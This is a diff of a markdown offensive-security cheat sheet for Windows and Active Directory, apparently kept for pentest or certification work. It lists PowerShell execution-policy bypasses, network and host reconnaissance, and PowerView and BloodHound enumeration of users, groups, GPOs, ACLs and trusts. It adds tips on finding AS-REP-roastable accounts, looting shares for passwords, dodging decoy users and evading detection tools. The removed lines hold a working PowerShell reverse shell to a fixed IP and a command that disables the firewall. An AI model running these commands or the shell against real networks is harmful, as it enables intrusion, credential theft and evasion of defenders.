@@ -93,594 +93,383 @@
 
 ## General
 
-- **PowerShell execution policy bypass:**
+- **Bypass PowerShell execution policy:**
 
   ```powershell
-  # Start PowerShell with execution policy bypass
-  powershell -ExecutionPolicy bypass
-
-  # Run a single command
-  powershell -c <cmd>
-
-  # Run an encoded command
-  powershell -encodedcommand
-
-  # Set process preference
-  $env:PSExecutionPolicyPreference="bypass"
+  Set-ExecutionPolicy Bypass -Scope Process
+  $env:PSExecutionPolicyPreference = "bypass"
   ```
-
+  
 - **Use domain credentials from a non-domain joined host:**
-  When the PC is not joined to the domain and we have AD credentials, `runas /netonly` injects the credentials into memory. Local commands run as the current Windows account, while network connections use the supplied domain account.
 
   ```cmd
   runas.exe /netonly /user:<DomainName>\<Username> cmd.exe
   ```
 
-- **Reverse shell:**
-
-  ```powershell
-  $client = New-Object System.Net.Sockets.TCPClient('10.50.112.55',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
-  ```
-
-- **Set DNS to the domain controller:**
-  Use this if DNS is not automatically configured. Typically, the domain controller is also the DNS server.
+- **Set DNS to the domain controller when resolution is not configured:**
 
   ```powershell
   $dnsip = "<DCIP>"
-  $index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
+  $index = Get-NetAdapter -Name "Ethernet" | Select-Object -ExpandProperty ifIndex
   Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
   ```
 
 ## Initial Reconnaissance
 
-Commands for initial reconnaissance including system info, network stats, and user privileges.
-- **Netstat:**
+- **Conextual Awareness:**
 
   ```powershell
-  # Netstat
-  netstat -na
-  ```
-- **ARP Table:**
-
-  ```powershell
-  # ARP Table
-  arp -a
-  ```
-- **Same machine Port enumeration:**
-
-  ```powershell
-  # Same machine Port enumeration
-  for($i=130; $i -le 140; $i++){Test-NetConnection localhost -Port $i}
-  ```
-- **Other machine discovery:**
-
-  ```powershell
-  # Other machine discovery
-  1..255 | %{echo "10.0.2.$_"; ping -n 1 10.10.168.$_ | Select-String ttl}
-  ```
-- **Other machines Open ports:**
-
-  ```powershell
-  # Other machines Open ports
-  1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.2.8", $_)) "Open port on - $_"} 2>$null
-  ```
-- **Domain Check:**
-
-  ```powershell
-  # Domain Check
-  systeminfo | findstr Domain
-  ```
-- **System Information:**
-
-  ```powershell
-  # System Information
+  # Host/Domain context
   systeminfo
-  ```
-- **IP Configuration:**
-
-  ```powershell
-  # IP Configuration
-  ipconfig /all
-  ```
-- **IPs, Ports, Processes Correlation:**
-
-  ```powershell
-  # IPs, Ports, Processes Correlation
-  netstat -abno
-  ```
-- **User Privileges:**
-
-  ```powershell
-  # User Privileges
-  whoami /priv
-  ```
-- **User Group Memberships:**
-
-  ```powershell
-  # User Group Memberships
-  whoami /groups
-  ```
-- **SMB Shares:**
-
-  ```powershell
-  # SMB Shares
-  net share
-  ```
-- **All the commands in a module can be listed with:**
-
-  ```powershell
-  # All the commands in a module can be listed with
-  Get-Command -Module <modulename>
-  ```
-- **Shares on Hosts in Current Domain:**
-
-  ```powershell
-  # Shares on Hosts in Current Domain
-  Invoke-ShareFinder -Verbose
-  ```
-- **Sensitive File Finder in Domain:**
-
-  ```powershell
-  # Sensitive File Finder in Domain
-  Invoke-FileFinder -Verbose
-  ```
-- **File Servers of the Domain:**
-
-  ```powershell
-  # File Servers of the Domain
-  Get-NetFileServer
-  ```
-- **Enumerate Users and Groups:**
-
-  ```powershell
-  # Enumerate Users and Groups
-  net user
-  net user /domain
-  net group
-  net group /domain
-  net localgroup
-  net localgroup administrators
-  Get-ADUser -Filter *
-  net user nikos.alvanos /domain
-  ```
-- **Password Policies:**
-
-  ```powershell
-  # Password Policies
-  net accounts /domain
-  ```
-- **Check the service state for Windows Defender:**
-
-  ```powershell
-  # Check the service state for Windows Defender
-  Get-Service WinDefend
-  ```
-- **Check the options enabled or disabled on Antivirus:**
-  Optional:
-
-  ```powershell
-  # Check the options enabled or disabled on Antivirus
-  Get-MpComputerStatus
-  | select RealTimeProtectionEnabled
-  ```
-- **Check Firewall profiles:**
-  Optional quick check:
-
-  ```powershell
-  # Check Firewall profiles
-  Get-NetFirewallProfile
-  | Format-Table Name, Enabled
-  ```
-- **Inspect firewall rules:**
-
-  ```powershell
-  # Inspect firewall rules
-  Get-NetFirewallRule | select DisplayName, Enabled, Direction, Action
-  ```
-- **Disable Firewall profiles if admin permissions are available:**
-
-  ```powershell
-  # Disable Firewall profiles if admin permissions are available
-  Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
-  ```
-- **Test connections for inbound connections, open ports, and other computers in the network:**
-
-  ```powershell
-  # Test connections for inbound connections, open ports, and other computers in the network
-  Test-NetConnection -ComputerName 127.0.0.1 -Port 80
-  ```
-- **Find Specific service of interest:**
-
-  ```powershell
-  # Find Specific service of interest
-  wmic service where "name like 'Vuln Service'" get name,PathName
-  Get-Process -Name OXI-service
-  nestat -aon |findstr "LISTENING" | findstr "3212"
-  ```
-- **LDAP Enumeration:**
-  Examples with
-
-  ```powershell
-  # LDAP Enumeration
-  Get-ADUser -Filter * -SearchBase "CN=Users,DC=EIMAIREDTEAM,DC=COM"`Using the SearchBase option, we specify a specific Common-Name CN,The DN consists of Domain Component (DC), OrganizationalUnitName (OU), Common Name (CN)
-  ```
-- **Access SYSVOL:**
-  (The first uses Kerberos, and the second uses a stealthier NTLM authentication method.)
-
-  ```powershell
-  # Access SYSVOL
-  dir \\za.NAI.com\SYSVOL
-  dir \\<DCIP>\SYSVOL
-  ```
-
-- **AV Detection:**
-  and Windows servers may not have SecurityCenter2 namespace, but workstations have
-
-  ```powershell
-  # AV Detection
-  wmic /namespace:\root\securitycenter2 path antivirusproduct
-  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
-  ```
-- **File and Directory Permissions:**
-  Owner of a directory , view permissions with , grant full permissions with , and remove a user's permissions with:
-
-  ```powershell
-  # File and Directory Permissions
-  Get-Acl c:/
-  icacls <directory>
-  icacls c:\users /grant joe:f
-  icacls c:\users /remove joe
-  Get-Location
-  ```
-- **Processes:**
-
-  ```powershell
-  # Processes
+  
+  # Check the proccesses
   Get-Process
+  
+  # Scheduled execution surface
+  Get-ScheduledTask
+
+  # Service inventory
+  Get-CimInstance Win32_Service | Select Name, DisplayName, State, ProcessId, PathName
+  
+  # Nearby LAN machines
+  arp -a
+
+  # Connections and listeners 
+  netstat -ano
+
+  # IP, DNS, gateway, subnet context
+  ipconfig /all
+
+  # Defender posture
+  Get-MpComputerStatus
+
+  # Firewall rule surface
+  Get-NetFirewallRule | select DisplayName, Enabled, Direction, Action
+
+  # Locate Security Product binary
+  Get-ChildItem -Path C:\ -Include MsSense.exe -File -Recurse -ErrorAction SilentlyContinue
+
+  # AV detection (Workstation only, not servers)
+  wmic /namespace:\root\securitycenter2 path antivirusproduct
   ```
-- **Listening Ports and Installed Updates:**
-  and ,
+- **User, Group and Share Enumeration:**
 
   ```powershell
-  # Listening Ports and Installed Updates
-  Get-NetTCPConnection | Where-Object -Property state -Match Listen
-  wmic qfe get Caption, Description
-  Get-HotFix
-  Get-Hotfix -Id KB4023834
-  ```
-- **Scheduled Tasks:**
-  Examples with and
+  # Domain password policy
+  net accounts /domain
+  
+  # Privileges in current token
+  whoami /priv
+
+  # Group-based access
+  whoami /groups
+
+  # List local users
+  net user
+
+  # Local SMB exposure
+  net share
+  
+  # List domain users
+  net user /domain
+
+  # List local groups
+  net group
+
+  # List domain groups
+  net group /domain
+
+  # List local machine groups
+  net localgroup
+
+  # List local Administrators group members
+  net localgroup administrators
+
+  # Query a specific domain user
+  net user 0xIapetus /domain
+  
+- **Port and Host Discovery:**
 
   ```powershell
-  # Scheduled Tasks
-  Get-ScheduledTask -TaskName new-sched-task
-  schtasks /query /tn vulntask /fo list /v
-  ```
-- **File Searches:**
+  # Local port range check
+  for($i=130; $i -le 140; $i++){Test-NetConnection localhost -Port $i}
 
-  ```powershell
-  # File Searches
-  Get-ChildItem -Path C:\ -Include *interesting-fle.txt* -File -Recurse -ErrorAction SilentlyContinue
-  Get-Content "C:\Program Files\interestingfile.txt.txt"
+  # Find live hosts in subnet
+  1..255 | %{echo "10.10.168.$_"; ping -n 1 10.10.168.$_ | Select-String ttl}
+
+  # TCP sweep one host
+  1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.2.8", $_)) "Open port on - $_"} 2>$null
   ```
 
 ## Domain Enumeration
 
-- **Uncover Domain Controllers via DNS (Location of services through the DNS SRV type, without having to scan a single port):**
+- **DNS and Domain Context:**
 
   ```powershell
-  # Uncover Domain Controllers via DNS (Location of services through the DNS SRV type, without having to scan a single port)
-  dig -t SRV _ldap._tcp.goblins.local`Linux based systems, `Resolve-DnsName -Type SRV _ldap._tcp.goblins.local`From PowerShell, `nslookup -type=srv _ldap._tcp.goblins.local` From Windows CMD
-  ```
-
-Commands specific to domain enumeration, including user and group listings, domain controllers, and policies.
-- **The ActiveDirectory PowerShell module (MS signed):**
-
-  ```powershell
-  # The ActiveDirectory PowerShell module (MS signed)
-  Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
-  Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
-  ```
-- **Install RSAT Tools and perform enumeration:**
-
-  ```powershell
-  # Install RSAT Tools and perform enumeration
-  Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
-  ```
-- **Current Domain Information:**
-  (PowerView), (ActiveDirectory Module)
-
-  ```powershell
-  # Current Domain Information
+  # Uncover Domain Controllers via DNS SRV type, cmd only
+  nslookup -type=srv _ldap._tcp.goblins.local 
+   
+  # Current domain context
   Get-Domain
-  Get-ADDomain
-  ```
-- **Domain object and SID:**
 
-  ```powershell
-  # Domain object and SID
-  Get-Domain -Domain moneycorp.local
-  Get-ADDomain -Identity moneycorp.local
+  #  Get Specific domain 
+  Get-Domain -Domain <DomainName>
+
+  # Domain SID
   Get-DomainSID
+
   ```
-- **Get domain policy for the current domain:**
+
+- **Domain Policy and Controllers:**
 
   ```powershell
-  # Get domain policy for the current domain
+  # Domain policy
   Get-DomainPolicyData
-  ```
-- **Get domain policy for another domain:**
 
-  ```powershell
-  # Get domain policy for another domain
-  (Get-DomainPolicyData -Domain moneycorp.local).systemaccess
-  ```
+  # Password policy (bruteforce usefull, age/etc.)
+  (Get-DomainPolicyData).SystemAccess
 
-- **Domain Controllers:**
-  Listing and discovering domain controllers with , , ,
+  # Kerberos policy (Usefull for creating golden/silver tickets)
+  (Get-DomainPolicyData).KerberosPolicy
 
-  ```powershell
-  # Domain Controllers
+  # Target domain password policy
+  (Get-DomainPolicyData -Domain <DomainName>).SystemAccess
+
+  # Domain controllers
   Get-DomainController
-  Get-ADDomainController
-  Get-DomainController -Domain moneycorp.local
-  Get-ADDomainController -DomainName moneycorp.local -Discover
+
+  # Target domain controllers
+  Get-DomainController -Domain <DomainName>
+
   ```
-- **User Listings:**
-  Examples with , ,
+
+- **Users and Interesting Attributes:**
 
   ```powershell
-  # User Listings
-  Get-DomainUser
-  Get-DomainUser -Identity student1
-  Get-ADUser -Filter * -Properties *
-  Get-ADUser -Identity student1 -Properties *
-  ```
-- **Get list of all properties for users in the current domain:**
+  
+  # All domain users
+  Get-DomainUser | Out-File -FilePath .\DomainUsers.txt
 
-  ```powershell
-  # Get list of all properties for users in the current domain
-  Get-DomainUser -Identity student1 -Properties * Get-DomainUser -Properties samaccountname,logonCount Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member - MemberType *Property | select Name
-  Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset )}}
-  ```
-- **Get all the groups in the current domain:**
+  # Specific user
+  Get-DomainUser -Identity <Username>
 
-  ```powershell
-  # Get all the groups in the current domain
-  Get-DomainGroup | select Name
-  Get-DomainGroup -Domain <TargetDomain>
-  Get-ADGroup -Filter * | select Name
-  Get-ADGroup -Filter * -Properties *
-  ```
-- **Group Listings:**
-  Get all groups containing the word "admin" in group name
+  # Avoid decoy users and prefer high logon count and pwdlastset close to today's date
+  Get-DomainUser -Properties SamAccountName,LogonCount,pwdlastset
 
-  ```powershell
-  # Group Listings
-  Get-DomainGroup *admin*
-  Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
-  ```
-- **Active users with high logoncount:**
-  Check for active users with high logoncount, bad idea to target low logoncount users.
+  # All disabled users
+  Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
 
-  ```powershell
-  # Active users with high logoncount
-  Get-DomainUser -Properties samaccountname,logonCount
-  ```
-- **Check descriptions, passwords or ...:**
+  # All users that need smart card authentication
+  Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
 
-  ```powershell
-  # Check descriptions, passwords or ..
+  # Find Users with an SPN set (maybe service accounts)
+  Get-DomainUser -SPN
+
+  # Users who don't have kerberos preauthentication set (bruteforce the TGT to get the pass)
+  Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+
+  # Users with sidHistory set
+  Get-DomainUser -LDAPFilter '(sidHistory=*)'
+
+  # User membership context
+  Get-DomainUser -Identity <Username> -Properties DisplayName,MemberOf | Format-List
+
+  #Finds all machines on the current domain where the current user has local admin access
+  Find-LocalAdminAccess -Verbose
+
+  #Find local admins on all machines of the domain
+  Find-DomainLocalGroupMember -Verbose
+
+  # User property discovery
+  Get-DomainUser -Identity student1 -Properties *
+
+  # Description field loot 
   Get-DomainUser -LDAPFilter "Description=*pass*" | Select name,Description
+  Get-DomainUser | Select name,Description
   ```
-- **Get a list of computers in the current domain:**
+
+- **Groups and Admin Paths:**
 
   ```powershell
-  # Get a list of computers in the current domain
-  Get-DomainComputer | select Name
-  Get-DomainComputer-OperatingSystem "*Server 2016*"
-  Get-DomainComputer -Ping
-  Get-ADComputer -Filter * | select Name
-  Get-ADComputer -Filter * -Properties *
-  Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
-  Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
-  ```
-- **Get all the groups in the current domain.:**
-
-  ```powershell
-  # Get all the groups in the current domain
+  # All domain groups
   Get-DomainGroup | select Name
-  Get-DomainGroup -Domain <TargetDomain>
-  Get-ADGroup -Filter * | select Name
-  Get-ADGroup -Filter * -Properties *
-  ```
-- **Get all groups containing the word "admin" in group name:**
+    
+  # Target domain groups
+  Get-DomainGroup -Domain <DomainName>
 
-  ```powershell
-  # Get all groups containing the word "admin" in group name
+  # Admin-like domain groups 
   Get-DomainGroup *admin*
-  Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
-  ```
-- **Get all the members of the Domain Admins group:**
 
-  ```powershell
-  # Get all the members of the Domain Admins group
+  # Admin-like net groups 
+  Get-NetGroup *admin*
+
+  #Return members of Specific Group 
+  Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
+
+  # Domain Admins membership
   Get-DomainGroupMember -Identity "Domain Admins" -Recurse
-  Get-ADGroupMember -Identity "Domain Admins" -Recursive
-  ```
-- **Get the group membership for a user:**
 
-  ```powershell
-  # Get the group membership for a user
-  Get-DomainGroup -UserName "student1"
-  Get-ADPrincipalGroupMembership -Identity student1
-  ```
-- **List all the local groups on a machine (needs administrator privs on non-dc machines):**
+  # User group memberships
+  Get-DomainGroup -UserName <Username>
 
-  ```powershell
-  # List all the local groups on a machine (needs administrator privs on non-dc machines)
-  Get-NetLocalGroup -ComputerName dcorp-dc -ListGroups
-  ```
-- **Get members of all the local groups on a machine (needs administrator privs on non-dc machines):**
+  # Target domain Enterprise Admins
+  Get-NetGroupMember -GroupName "Enterprise Admins" -Domain <DomainName>
 
-  ```powershell
-  # Get members of all the local groups on a machine (needs administrator privs on non-dc machines)
-  Get-NetLocalGroup -ComputerName dcorp-dc -Recurse
-  ```
-- **Members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines):**
-
-  ```powershell
-  # Members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines)
-  Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
-  ```
-- ** actively logged users on a computer (needs local admin rights on the target)
-```powershell
-Get-NetLoggedon -ComputerName <ServerName>
-```
-- **Get actively logged users on a computer (needs local admin rights on the target):**
-
-  ```powershell
-  # Get actively logged users on a computer (needs local admin rights on the target)
-  Get-LoggedonLocal -ComputerName dcorp-dc
-  ```
-- **Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)**
-- **Get the last logged user on a computer (needs administrative rights and remote registry on the target):**
-
-  ```powershell
-  # Get the last logged user on a computer (needs administrative rights and remote registry on the target)
-  Get-LastLoggedOn -ComputerName <ServerName>
   ```
 
-## GPO Policy
-
-Commands related to Group Policy Objects (GPO) in Active Directory environments.
-- **List of GPO in Current Domain:**
+- **Computers and Live Hosts:**
 
   ```powershell
-  # List of GPO in Current Domain
-  Get-DomainGPO
-  Get-DomainGPO -ComputerIdentity dcorp-student1
+
+  # Domain computers
+  Get-DomainComputer -Properties OperatingSystem,Name,DnsHostName | Sort-Object DnsHostName
+
+  # Server OS targets
+  Get-DomainComputer -OperatingSystem "*Server 2016*"
+
   ```
-- **GPOs Using Restricted Groups:**
+
+- **Sessions and User Hunting:**
 
   ```powershell
-  # GPOs Using Restricted Groups
-  Get-DomainGPOLocalGroup
-  ```
-- **Users in Local Group via GPO:**
+  #  Actively Logged-on users (needs local admin rights on the target)
+  Get-NetLoggedon -ComputerName <ComputerName>
 
-  ```powershell
-  # Users in Local Group via GPO
-  Get-DomainGPOComputerLocalGroupMapping-ComputerIdentity dcorp-student1
-  ```
-- **Machines with User as Specific Group Member via GPO:**
+  # Active sessions
+  Get-NetSession -ComputerName <ComputerName>
 
-  ```powershell
-  # Machines with User as Specific Group Member via GPO
-  Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
-  ```
-- **Organizational Units (OUs):**
+  # Local logon history
+  Get-LoggedonLocal -ComputerName <ComputerName>
 
-  ```powershell
-  # Organizational Units (OUs)
-  Get-DomainOU
-  Get-ADOrganizationalUnit -Filter * -Properties *
-  ```
-- **GPO Applied on an OU:**
+  # Find where users are active
+  Find-DomainUserLocation
 
-  ```powershell
-  # GPO Applied on an OU
-  Get-DomainGPO -Identity "{AB306569-220D-43FF-B03B-83E8F4EF8081}"
-  ```
-- **ACLs for Objects:**
+  # Find loggen on users in the target domain machines
+  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName,SessionFromName
 
-  ```powershell
-  # ACLs for Objects
-  Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
-  ```
-- **Get the ACLs associated with the specified prefix to be used for search:**
-
-  ```powershell
-  # Get the ACLs associated with the specified prefix to be used for search
-  Get-DomainObjectAcl -SearchBase "LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
-  ```
-- **We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs:**
-
-  ```powershell
-  # We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs
-  (Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
-  ```
-- **Search for interesting ACEs:**
-
-  ```powershell
-  # Search for interesting ACEs
-  Find-InterestingDomainAcl -ResolveGUIDs
-  ```
-- **Get the ACLs associated with the specified path:**
-
-  ```powershell
-  # Get the ACLs associated with the specified path
-  Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
-  ```
-- **Get a list of all domain trusts for the current domain:**
-
-  ```powershell
-  # Get a list of all domain trusts for the current domain
-  Get-DomainTrust
-  Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
-  ```
-- **Get AD Trust details:**
-
-  ```powershell
-  # Get AD Trust details
-  Get-ADTrust
-  Get-ADTrust-Identity us.dollarcorp.moneycorp.local
-  ```
-- **Get details about the current forest:**
-
-  ```powershell
-  # Get details about the current forest
-  Get-Forest
-  Get-Forest -Forest eurocorp.local
-  Get-ADForest
-  Get-ADForest -Identity eurocorp.local
-  ```
-- **Get all domains in the current forest:**
-
-  ```powershell
-  # Get all domains in the current forest
-  Get-ForestDomain
-  Get-ForestDomain -Forest eurocorp.local
-  ```
-- **Get all global catalogs for the current forest:**
-
-  ```powershell
-  # Get all global catalogs for the current forest
-  Get-ForestGlobalCatalog
-  Get-ForestGlobalCatalog -Forest eurocorp.local
-  Get-ADForest | select -ExpandProperty GlobalCatalogs
-  ```
-- **Map trusts of a forest:**
-
-  ```powershell
-  # Map trusts of a forest
-  Get-ForestTrust
-  Get-ForestTrust -Forest eurocorp.local
-  Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
-  ```
-- **Find computers where a domain admin session is available:**
-
-  ```powershell
-  # Find computers where a domain admin session is available
+  # Stealthier user hunting
   Find-DomainUserLocation -Stealth
   ```
-- **BloodHound to avoid detections like ATA:**
+
+- **Shares and SYSVOL:**
 
   ```powershell
-  # BloodHound to avoid detections like ATA
-  Invoke-BloodHound -CollectionMethod All -ExcludeDC
+  # Domain shares
+  Find-DomainShare
+
+  # Find shares with filtered noise
+  Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
+
+  # Readable domain shares
+  Find-DomainShare -CheckShareAccess
+
+  #Enumerate "Interesting" Files on accessible shares
+  Find-InterestingDomainShareFile -Include *passwords*
+
+  # Host share listing
+  Get-NetShare -ComputerName <ComputerName>
+
+  # SYSVOL over Kerberos (GPO and script share loot)
+  dir \\<DomainName>\SYSVOL
+
+  # SYSVOL over NTLM (GPO and script share loot)
+  dir \\<DCIP>\SYSVOL
   ```
 
+- **GPOs and OUs:**
+
+  ```powershell
+
+  # All GPOs
+  Get-DomainGPO
+
+  # GPOs linked to a computer
+  Get-DomainGPO -ComputerIdentity <ComputerName>
+
+  # Which GPOs are granting local group access on domain machines.
+  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
+  
+  # Get Users which are a in Local Group of a machine via GPO
+  Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity <ComputerName>
+
+  # Get Machines where a User is a Member of a Group
+  Get-DomainGPOUserLocalGroupMapping -Identity <Username> -Verbose
+
+  # All OUs
+  Get-DomainOU
+
+  # OU-linked GPOs
+  Get-DomainOU | Select-Object Name,GPLink
+ 
+
+  # Find interesting ACLs on GPOs:
+  Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs
+
+  # Find where a GPO applies:
+  Get-DomainOU -GPLink "{GPO-GUID}"
+
+  # Find users/groups with rights over GPOs
+  Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.ObjectDN -like "*CN=Policies,CN=System*"}
+  ```
+
+- **ACLs and Object Control:**
+
+  ```powershell
+  # Object ACLs
+  Get-DomainObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
+
+  # Interesting ACLs
+  Find-InterestingDomainAcl -ResolveGUIDs
+
+  # ACLs owned by a user
+  Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "<Username>"}
+
+  # Object owner
+  Get-DomainObjectOwner -Identity <AccountName>
+  ```
+
+- **Trusts and Forests:**
+
+  ```powershell
+  # Domain trusts
+  Get-DomainTrust
+
+  # Target domain trust
+  Get-DomainTrust -Domain <DomainName>
+
+  # Current forest
+  Get-Forest
+
+
+  # Target forest
+  Get-Forest -Forest <ForestName>
+
+  # Forest trusts
+  Get-ForestTrust
+
+  # Global catalogs
+  Get-ForestGlobalCatalog
+  ```
+
+- **Local Groups on Domain Hosts:**
+
+  ```powershell
+  # Local groups on host (needs administrator privs on non-dc machines)
+  Get-NetLocalGroup -ComputerName <ComputerName> -ListGroups
+
+  # Local group members
+  Get-NetLocalGroupMember -ComputerName <ComputerName> -GroupName Administrators
+  ```
+
+- **BloodHound Collection:**
+
+  ```powershell
+  # Full BloodHound collection
+  Invoke-BloodHound -CollectionMethod All
+
+  # Full collection without touching DC (maybe stealthier,avoid tools like MDI)
+  Invoke-BloodHound -CollectionMethod All -ExcludeDC
+  ```
 ## Privilege Escalation
 
 Techniques and commands for elevating privileges.
